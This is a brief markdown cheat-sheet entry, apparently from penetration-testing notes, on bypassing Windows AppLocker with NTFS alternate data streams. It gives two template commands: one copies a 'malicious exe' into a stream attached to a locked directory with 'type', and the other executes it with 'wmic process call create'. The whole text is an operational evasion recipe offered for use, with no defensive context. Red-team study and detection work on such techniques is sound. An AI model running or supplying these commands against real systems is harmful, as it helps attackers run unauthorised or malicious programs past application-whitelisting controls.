## bypass applocker unsing alternate data streams

### Copy malicious exe into the locked directory (current working directory must be one level above the locked directory)
```
type <path\to\file.exe> > .\<lockedDirectory>:<file.exe>
```

### Execute
```
wmic process call create '"%CD%\<lockedDirectory>:<file.exe>"'
```

